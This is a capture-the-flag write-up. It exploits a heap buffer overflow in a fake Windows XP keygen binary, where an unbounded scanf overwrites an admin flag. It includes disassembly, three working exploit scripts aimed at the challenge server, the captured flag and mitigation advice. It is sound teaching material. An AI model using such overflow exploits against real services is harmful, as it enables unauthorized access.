# KeygenXP Premium
## Challenge Information
- **Category**: Binary Exploitation / PWN
- **Challenge**: KeygenXP_Premium
- **Remote**: nc 51.210.244.18 11337

## Challenge Description
> You finally find a keygen for windows xp ! But it seems to be some fake key... Or maybe it is possible to make it act differently

## Initial Analysis

### Binary Protections
Running `pwn checksec` reveals:
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Key observations:
- **No Stack Canary**: Buffer overflows won't trigger canary checks
- **NX Enabled**: Can't execute shellcode, but we don't need to
- **No PIE**: Static addresses
- **Not Stripped**: Function names available

### Running the Binary

```bash
$ ./keygen
--- WindowsXP Premium Keygen v1.4 ---
number of key to generate : 1
Debug: Allocation of memory...
What's your name : test

Hello User : test
Admin : NON

[!] Standard access : Generation...
Key [1] : A5B3-9F82-C0E1-4D76-2A9B
```

The program:
1. Asks for the number of keys to generate
2. Allocates memory
3. Asks for our name
4. Checks if we're an admin
5. Either gives premium access or generates standard keys

## Vulnerability Analysis

### The User Structure

Looking at the disassembly, we can see the program allocates a user structure:

```asm
0x004013c4      bf14000000     mov edi, 0x14      ; malloc(0x14) = 20 bytes
0x004013c9      e8d2fcffff     call malloc
0x004013ce      488945e8       mov [var_18h], rax ; Store in var_18h

; Initialize admin flag to 0
0x004013e3      488b45e8       mov rax, [var_18h]
0x004013e7      c74010000000.  mov dword [rax + 0x10], 0  ; admin = 0 at offset 0x10
```

The structure is:
```c
struct user {
    char name[16];     // Offset 0x00 - 0x0F
    int admin;         // Offset 0x10 - 0x13
};
```

### The Vulnerability: Unbounded scanf()

The critical vulnerability is here:

```asm
0x004013ee      bfdf204000     mov edi, "What's your name : "
0x004013f3      b800000000     mov eax, 0
0x004013f8      e863fcffff     call printf

; Vulnerable scanf with %s format (no length limit!)
0x004013fd      488b45e8       mov rax, [var_18h]    ; Load user struct pointer
0x00401401      4889c6         mov rsi, rax          ; Pass as second argument
0x00401404      bff3204000     mov edi, 0x4020f3     ; "%s" format string
0x00401409      b800000000     mov eax, 0
0x0040140e      e8bdfcffff     call scanf            ; scanf("%s", user->name)
```

**The vulnerability**: `scanf("%s", user->name)` has no bounds checking. We can overflow the 16-byte `name` field and overwrite the `admin` flag at offset 0x10!

### The Admin Check

After reading the name:

```asm
0x00401429      488b45e8       mov rax, [var_18h]
0x0040142d      8b4010         mov eax, [rax + 0x10]  ; Load admin flag
0x00401430      83f801         cmp eax, 1
0x00401433      7519           jne 0x40144e           ; If not admin, skip

; If admin == 1:
0x00401435      bf08214000     mov edi, "Admin : OUI"
0x0040143a      e801fcffff     call puts
0x0040143f      b800000000     mov eax, 0
0x00401444      e89dfdffff     call premium           ; Call premium()!
```

If `admin == 1`, the program calls the `premium()` function which reads and displays `flag.txt`.

### The premium() Function

```asm
┌ sym.premium:
│   0x004011ee   mov esi, "r"
│   0x004011f3   mov edi, "flag.txt"
│   0x004011f8   call fopen
│   0x004011fd   mov [stream], rax
│   ...
│   0x00401218   lea rax, [s]
│   0x0040121c   mov esi, 0x40
│   0x00401221   mov rdi, rax
│   0x00401224   call fgets          ; Read flag
│   ...
│   0x0040122e   mov edi, "\nADMIN ACCESS GRANTED !"
│   0x00401233   call puts
│   0x00401238   lea rax, [s]
│   0x0040123c   mov rsi, rax
│   0x0040123f   mov edi, "Here is your premium key : %s\n"
│   0x00401244   mov eax, 0
│   0x00401249   call printf         ; Print flag!
```

## Exploitation Strategy

### Attack Plan
1. Answer the first prompt (number of keys) with any value
2. Overflow the name buffer with exactly 16 bytes of padding
3. Overwrite the `admin` flag (4 bytes at offset 0x10) with the value `1`

### Memory Layout
```
[      name (16 bytes)     ][admin (4 bytes)]
[ A A A A A A A A A A A A A A A A ][ \x01 \x00 \x00 \x00 ]
  0                           15 16                     19
```

We need:
- 16 bytes of filler (anything, e.g., "A" * 16)
- Then `\x01` to set the least significant byte of the `admin` int to 1

The `admin` field is a 4-byte integer (little-endian). We only need to set the first byte to `\x01`:
- Original: `0x00000000` (admin = 0)
- Target:   `0x00000001` (admin = 1)

## Exploit Implementation

### Method 1: Printf with netcat

```bash
printf '1\nAAAAAAAAAAAAAAAA\x01\n' | nc 51.210.244.18 11337
```

Breakdown:
- `1\n` - Answer "1" for number of keys
- `AAAAAAAAAAAAAAAA` - 16 bytes of padding to fill name buffer
- `\x01` - Overwrite first byte of admin to 1
- `\n` - Newline to submit

### Method 2: Python with pwntools

```python
#!/usr/bin/env python3
from pwn import *

# Connect to remote
io = remote('51.210.244.18', 11337)

# Receive prompt and send number of keys
io.recvuntil(b'number of key to generate : ')
io.sendline(b'1')

# Receive name prompt
io.recvuntil(b"What's your name : ")

# Build payload
payload = b'A' * 16      # Fill 16-byte name buffer
payload += b'\x01'       # Set admin = 1

io.sendline(payload)

# Get the flag
io.recvuntil(b'premium key : ')
flag = io.recvline().strip()
print(f"Flag: {flag.decode()}")

io.close()
```

### Method 3: Simple Python script

```python
#!/usr/bin/env python3
import socket

# Connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('51.210.244.18', 11337))

# Receive banner
data = s.recv(1024)
print(data.decode())

# Send number of keys
s.send(b'1\n')

# Receive prompt
data = s.recv(1024)
print(data.decode())

# Send payload
payload = b'A' * 16 + b'\x01\n'
s.send(payload)

# Get response
data = s.recv(4096)
print(data.decode())

s.close()
```

## Running the Exploit

```bash
$ printf '1\nAAAAAAAAAAAAAAAA\x01\n' | nc 51.210.244.18 11337
--- WindowsXP Premium Keygen v1.4 ---
number of key to generate : Debug: Allocation of memory...
What's your name : 
Hello User : AAAAAAAAAAAAAAAA

Admin : OUI

ADMIN ACCESS GRANTED !
Here is your premium key : HACKDAY{H34P_0V3RFL0W_K3Y_G3N}
```

## Flag

```
HACKDAY{H34P_0V3RFL0W_K3Y_G3N}
```

## Key Takeaways

1. **Unsafe Input Functions**: `scanf("%s", buf)` is dangerous - always use bounded reads
2. **Heap Overflows**: Not just stack buffers can be overflowed
3. **Structure Layout**: Understanding C struct memory layout is critical
4. **Integer Manipulation**: Only needed to set one byte to flip admin flag
5. **Simple Exploits**: Sometimes the exploit is just overflow + overwrite one value

## Mitigation

To prevent this vulnerability:

```c
// Bad (vulnerable):
scanf("%s", user->name);

// Good (bounded):
scanf("%15s", user->name);  // Limit to 15 chars + null terminator

// Better (with error checking):
if (fgets(user->name, sizeof(user->name), stdin) == NULL) {
    // Handle error
}
```

Additional protections:
- Enable stack canaries (though this is heap, consider heap canaries)
- Use `fgets()` instead of `gets()` or unbounded `scanf()`
- Validate input lengths
- Use safe string functions (`strncpy`, `strncat`, etc.)
- Consider separating sensitive fields into different allocations
- Add bounds checking in code

## Tools Used

- `checksec` / `pwn checksec` - Check binary protections
- `radare2` - Disassemble and analyze binary
- `nc` (netcat) - Connect to remote service
- `pwntools` - Python exploitation framework
- `printf` - Create payload with binary data
